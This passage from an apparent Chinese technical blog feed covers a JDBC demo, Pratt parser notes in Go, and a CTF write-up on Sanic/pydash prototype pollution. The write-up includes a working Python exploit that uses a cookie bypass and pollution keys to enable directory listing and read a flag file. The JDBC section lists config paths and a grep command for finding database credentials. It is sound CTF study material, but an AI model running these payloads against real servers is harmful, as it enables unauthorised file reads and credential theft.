class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCFirstDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 加载mysql的jdbc驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 用户信息和url</span></span><br><span class="line">        <span class="comment">// useUnicode=true  支持中文编码</span></span><br><span class="line">        <span class="comment">// characterEncoding=utf8   设定字符集</span></span><br><span class="line">        <span class="comment">// useSSL=true  使用安全的连接</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost/jdbcStudy?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=true&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;icfhadmin&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br><span class="line"></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(resultSet.next())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;id=&quot;</span> + resultSet.getObject(<span class="string">&quot;ID&quot;</span> ));</span><br><span class="line">            System.out.println(<span class="string">&quot;name=&quot;</span> +  resultSet.getObject(<span class="string">&quot;NAME&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;pwd=&quot;</span> + resultSet.getObject(<span class="string">&quot;PASSWORD&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;email=&quot;</span> + resultSet.getObject(<span class="string">&quot;email&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;both=&quot;</span> + resultSet.getObject(<span class="string">&quot;birthday&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        resultSet.close();</span><br><span class="line">        statement.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行可以发现获取了数据库的对应字段</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406182126089.png" alt="image-20240611200532286"></p><h3 id="Java特性在此过程中的体现"><a href="#Java特性在此过程中的体现" class="headerlink" title="Java特性在此过程中的体现"></a>Java特性在此过程中的体现</h3><h4 id="Class-forName在此过程中的作用"><a href="#Class-forName在此过程中的作用" class="headerlink" title="Class.forName在此过程中的作用"></a>Class.forName在此过程中的作用</h4><p>​使用<code>Class.forName</code>会触发类加载，<code>com.mysql.jdbc.Driver</code>类将会被初始化</p><p>​所以<code>static</code>代码块将会被执行</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406182126855.png" alt="image-20240611221807744"></p><p>​</p><p>​因此，想要反射某个类又不想初始化类方法有如下途径：</p><ul><li>使用<code>Class.forName(&quot;xxx&quot;, false, loader)</code>方法，第二个参数传入false</li><li><code>ClassLoader.load(&quot;xxx&quot;)</code></li></ul><h4 id="不使用Class-forName也能执行的原因-SPI"><a href="#不使用Class-forName也能执行的原因-SPI" class="headerlink" title="不使用Class.forName也能执行的原因&#x3D;&gt;SPI"></a>不使用Class.forName也能执行的原因&#x3D;&gt;SPI</h4><blockquote><p>Java SPI机制：JDK内置的一种 服务提供发现机制，可以用来启动框架扩展和替换组件，主要是被框架的开发人员使用，比如java.sql.Driver接口</p><p>通俗来说就是会自动发现依赖，然后加载</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406182126426.jpeg" alt="img"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406182126066.png" alt="image-20240611223620154"></p><h2 id="JDBC-数据库配置信息"><a href="#JDBC-数据库配置信息" class="headerlink" title="JDBC 数据库配置信息"></a>JDBC 数据库配置信息</h2><p>传统的Web应用的配置信息存放路径</p><ul><li><code>WEB-INF</code>目录下的<code>*.properites .yml *.xml</code></li><li>Spring boot项目:<code>src/main/resources/</code></li></ul><p>常见的存储数据库配置信息的文件路径</p><ul><li><code>WEB-INF/applicationContext.xml</code></li><li><code>WEB-INF/hibernate.cfg.xml</code></li><li><code>WEB-INF/jdbc/jdbc.properties</code></li><li>使用系统命令寻找,如寻找mysql: <code>find 路径 -type f |xargs grep &quot;com.mysql.jdbc.Driver&quot;</code></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JDBC/">https://longlone.top/%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JDBC/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sanic&amp;Pydash原型链污染复现</title>
      <link href="/2024/06/08/WebExploit/Python/Sanic-Pydash-Pollution/"/>
      <url>/2024/06/08/WebExploit/Python/Sanic-Pydash-Pollution/</url>
      
        <content type="html"><![CDATA[<h1 id="Sanic-Pydash原型链污染复现"><a href="#Sanic-Pydash原型链污染复现" class="headerlink" title="Sanic&amp;Pydash原型链污染复现"></a>Sanic&amp;Pydash原型链污染复现</h1><h2 id="static函数"><a href="#static函数" class="headerlink" title="static函数"></a>static函数</h2><p>函数原型如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">static</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    uri: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    file_or_directory: <span class="type">Union</span>[PathLike, <span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    pattern: <span class="built_in">str</span> = <span class="string">r&quot;/?.+&quot;</span>,</span></span><br><span class="line"><span class="params">    use_modified_since: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    use_content_range: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    stream_large_files: <span class="type">Union</span>[<span class="built_in">bool</span>, <span class="built_in">int</span>] = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    name: <span class="built_in">str</span> = <span class="string">&quot;static&quot;</span>,</span></span><br><span class="line"><span class="params">    host: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    strict_slashes: <span class="type">Optional</span>[<span class="built_in">bool</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    content_type: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    apply: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    resource_type: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    index: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">Sequence</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    directory_view: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    directory_handler: <span class="type">Optional</span>[DirectoryHandler] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        directory_view (bool, optional): Whether to fallback to showing</span></span><br><span class="line"><span class="string">            the directory viewer when exposing a directory. Defaults</span></span><br><span class="line"><span class="string">            to `False`.</span></span><br><span class="line"><span class="string">        directory_handler (Optional[DirectoryHandler], optional): An</span></span><br><span class="line"><span class="string">            instance of DirectoryHandler that can be used for explicitly</span></span><br><span class="line"><span class="string">            controlling and subclassing the behavior of the default</span></span><br><span class="line"><span class="string">            directory handler.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>重点关注下以上两个参数<code>directory_view</code>、<code>directory_handler</code>，这两个参数与读static目录有关</p><h2 id="directory-view"><a href="#directory-view" class="headerlink" title="directory_view"></a>directory_view</h2><p>测试的时候加上这个参数，然后访问static目录</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081841125.png" alt="image-20240608162635707"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081841780.png" alt="image-20240608162717923"></p><p>可以发现实现了目录读取</p><h2 id="directory-handler"><a href="#directory-handler" class="headerlink" title="directory_handler"></a>directory_handler</h2><p>调试技巧：找路由，因为static也是路由中的一部分，它应该是以表的形式进行存储</p><p>在Pycharm的补全下，可以发现有属性<code>app.router.name_index</code>列表，然后找到一处使用<code>name_index</code>的代码位置下断点，查看变量</p><p>可以发现<code>DirectoryHandler</code>对象</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081841812.png" alt="image-20240608170403339"></p><p>可以首先构造出的一条链子，需要设置为True</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__.app.router.name_index.__mp_main__.static.handler.keywords.directory_handler.directory_view</span><br></pre></td></tr></table></figure><h3 id="处理Path对象"><a href="#处理Path对象" class="headerlink" title="处理Path对象"></a>处理Path对象</h3><p>​其次是<code>WindowsPath</code>这个对象的处理</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081841997.png" alt="image-20240608170758035"></p><p>​在DirectoryHandler下个断点先，传入HTTP请求对象以及URI</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081841810.png" alt="image-20240608171245544"></p><p>​在开启directory_view的情况下会进入这个分支</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081840744.png" alt="image-20240608171353211"></p><p>​跟进会到这个函数中，可以发现</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081840663.png" alt="image-20240608171630048"></p><p>​</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081840037.png" alt="image-20240608171718383"></p><p>​</p><p>​接下来说明：主要是WindowsPath中的parts元组起作用了</p><p>​在最后的页面渲染前获取page</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081840776.png" alt="image-20240608174952125"></p><p>​self为WindowsPath文件对象，一直跟可以发现最后封装了os.listdir</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081840353.png" alt="image-20240608174745258"></p><p>​iterdir为生成器函数，遍历了static目录列表</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081840605.png" alt="image-20240608174811353"></p><p>​跟进查看self._accessor.listdir</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081840167.png" alt="image-20240608174850352"></p><p>​跟进</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081843070.png" alt="image-20240608174907092"></p><p>​看看listdir</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081840783.png" alt="image-20240608174108057"></p><p>​</p><p>​然后就是Windows文件对象怎么解析成字符串了，考虑魔术方法：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081840307.png" alt="image-20240608175739396"></p><p>​Windows对应于第一个代码块，对于Linux下应该就是else分支中的代码获取listdir路径</p><p>​此处使用parts作为元组，拼接成路径字符串</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081840665.png" alt="image-20240608181932069"></p><p>所以第二条链子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__.app.router.name_index.__mp_main__.static.handler.keywords.directory_handler.directory.parts</span><br></pre></td></tr></table></figure><h2 id="pydash原型链污染"><a href="#pydash原型链污染" class="headerlink" title="pydash原型链污染"></a>pydash原型链污染</h2><blockquote><p>首先得明确一点，原型链污染不会直接RCE的</p><p>原型链污染是通过污染一些关键函数的参数，导致了诸如拼接命令的执行，以及污染一些魔术变量来进行任意文件读、目录读</p></blockquote><p>漏洞场景：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pollute = Pollute()</span><br><span class="line">pydash.set_(pollute, key, value)</span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://203ca7f0-a069-4bff-b9bd-fc54ab33db47.challenge.ctf.show&quot;</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&#x27;&quot;adm\\073n&quot;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = s.get(url + <span class="string">&quot;/login&quot;</span>, cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改directory_view属性</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="comment"># app.router.name_index[&#x27;__mp_main__.static&#x27;].handler.keywords[&#x27;directory_handler&#x27;].directory_view</span></span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="literal">True</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp1 = s.get(url + <span class="string">&quot;/admin&quot;</span>, json=data1)</span><br><span class="line"><span class="built_in">print</span>(resp1.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="comment"># app.router.name_index[&#x27;__mp_main__.static&#x27;].handler.keywords[&#x27;directory_handler&#x27;].directory_view</span></span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: [<span class="string">&quot;/&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp2 = s.get(url + <span class="string">&#x27;/admin&#x27;</span>, json=data2)</span><br><span class="line"><span class="built_in">print</span>(resp2.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># resp3 = s.get(url + &#x27;/static/&#x27;)</span></span><br><span class="line"><span class="comment"># print(resp3.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 24bcbd0192e591d6ded1_flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">readflag = &#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span>: <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp3 = s.get(url+<span class="string">&#x27;/admin&#x27;</span>, json=readflag)</span><br><span class="line"></span><br><span class="line">resp4 = s.get(url+<span class="string">&#x27;/src&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp4.text)</span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202406081840222.png" alt="image-20240608183951812"></p><p>只能说这题，极具web调链的艺术！</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WebSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sanic_babyDev</title>
      <link href="/2024/06/07/Code/Sanic-babyDev/"/>
      <url>/2024/06/07/Code/Sanic-babyDev/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Pratt Parser学习笔记</title>
      <link href="/2024/05/27/Compile/Pratt-Parsers-WorkingMode/"/>
      <url>/2024/05/27/Compile/Pratt-Parsers-WorkingMode/</url>
      
        <content type="html"><![CDATA[<h1 id="普拉特解析学习笔记（）"><a href="#普拉特解析学习笔记（）" class="headerlink" title="普拉特解析学习笔记（）"></a>普拉特解析学习笔记（）</h1><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>Pratt Parser是一种自顶向下的语法分析器，主要原理有：</p><ul><li>把Token</li></ul><h2 id="测试过程分析"><a href="#测试过程分析" class="headerlink" title="测试过程分析"></a>测试过程分析</h2><p>比如测试用例是</p><blockquote><p>1+2+3 &#x3D;&gt; ((1+2)+3)</p></blockquote><p>我们需要将该表达式构建一棵语法树如下：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301131844.png" alt="image-20240527102550562"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestOperatorPrecedenceParsing</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">opTests := []<span class="keyword">struct</span> &#123;</span><br><span class="line">input    <span class="type">string</span></span><br><span class="line">expected <span class="type">string</span></span><br><span class="line">&#125;&#123;</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;1+2+3&quot;</span>,</span><br><span class="line"><span class="string">&quot;((1+2)+3)&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, tt := <span class="keyword">range</span> opTests &#123;</span><br><span class="line"></span><br><span class="line">l := lexer.New(tt.input) <span class="comment">// 构建词法解析器</span></span><br><span class="line">p := New(l)              <span class="comment">// 执行词法解析器 利用其中的nextToken逐个解析成词法单元</span></span><br><span class="line"></span><br><span class="line">program := p.ParseProgram()<span class="comment">// 语法分析, 获得的program为一棵语法树</span></span><br><span class="line">checkParserErrors(t, p)</span><br><span class="line"></span><br><span class="line">actual := program.String()</span><br><span class="line"><span class="keyword">if</span> actual != tt.expected &#123;</span><br><span class="line">t.Errorf(<span class="string">&quot;expected=%q, got=%q&quot;</span>, tt.expected, actual)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>调试</li></ul><p>​整个的函数调用栈</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301131258.png" alt="image-20240527113434668"></p><p>​<code>ParseProgram</code>中首先声明创建一个<code>ast.Program</code>，作为<code>AST</code>的根节点</p><p>​循环解析每一个<code>statement</code>，当碰到终止符时停止循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> ParseProgram() *ast.Program &#123;</span><br><span class="line">program := &amp;ast.Program&#123;&#125; <span class="comment">// 创建一个指向ast.Program的指针  (program为AST的根节点)</span></span><br><span class="line">program.Statements = []ast.Statement&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p.curToken.Type != token.EOF &#123;</span><br><span class="line">stmt := p.parseStatement()<span class="comment">// 解析statement</span></span><br><span class="line"><span class="keyword">if</span> stmt != <span class="literal">nil</span> &#123;</span><br><span class="line">program.Statements = <span class="built_in">append</span>(program.Statements, stmt)<span class="comment">// 将解析成的statement </span></span><br><span class="line">&#125;</span><br><span class="line">p.nextToken()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> program</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​在<code>parseStatement</code>函数中，然后选择<code>Statement</code>类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> parseStatement() ast.Statement &#123;</span><br><span class="line"><span class="keyword">switch</span> p.curToken.Type &#123;</span><br><span class="line">        <span class="keyword">case</span> token.LET:</span><br><span class="line">            <span class="keyword">return</span> p.parseLetStatement()</span><br><span class="line">        <span class="keyword">case</span> token.RETURN:</span><br><span class="line">            <span class="keyword">return</span> p.parseReturnStatement()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> p.parseExpressionStatement()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​在<code>parseExpressionStatement</code>中，首先创建<code>ast.ExpressionStatement</code>这个结构体，然后以最低优先级（<code>LOWEST</code>）调用解析函数<code>parseExpression</code>函数（因为是普通的Expression，所以直接使用最低优先级即可）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> parseExpressionStatement() *ast.ExpressionStatement &#123;</span><br><span class="line">stmt := &amp;ast.Expression Statement&#123;</span><br><span class="line">Token: p.curToken,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stmt.Expression = p.parseExpression(LOWEST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> p.peekTokenIs(token.SEMICOLON) &#123;</span><br><span class="line">p.nextToken()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> stmt</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​调用<code>parseExpression</code>函数中，首先根据curToken的类型处理成对应的Expression</p><p>​然后进入普拉特语法解析器，如果不满足直接返回上述生成的Expression</p><ol><li>判断是否为分号，以及判断peekToken的优先级</li></ol><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301131466.png" alt="image-20240527152540314"></p><ol start="2"><li>取中缀表达式进行解析</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span></span> parseExpression(precedence <span class="type">int</span>) ast.Expression &#123;</span><br><span class="line">prefix := p.prefixParseFns[p.curToken.Type] <span class="comment">// 选取前缀表达式解析函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> prefix == <span class="literal">nil</span> &#123;</span><br><span class="line">p.noPrefixParseFnError(p.curToken.Type)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">leftExp := prefix() <span class="comment">// 执行解析函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 普拉特语法分析器核心</span></span><br><span class="line">    <span class="comment">// 检查peekToken是否为分号token和优先级</span></span><br><span class="line"><span class="keyword">for</span> !p.peekTokenIs(token.SEMICOLON) &amp;&amp; precedence &lt; p.peekPrecedence() &#123;</span><br><span class="line">infix := p.infixParseFns[p.peekToken.Type] <span class="comment">// 取出中缀表达式的解析函数</span></span><br><span class="line"><span class="keyword">if</span> infix == <span class="literal">nil</span> &#123;                          <span class="comment">// 无中缀表达式, 则直接返回</span></span><br><span class="line"><span class="keyword">return</span> leftExp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p.nextToken()</span><br><span class="line">leftExp = infix(leftExp)</span><br><span class="line"><span class="comment">// 表达式: ((1+3) &gt; 2;)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> leftExp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​</p><p>​所以，在经过整个函数调用栈之后，函数参数如图所示：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202405301131868.png" alt="image-20240527114414979"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a 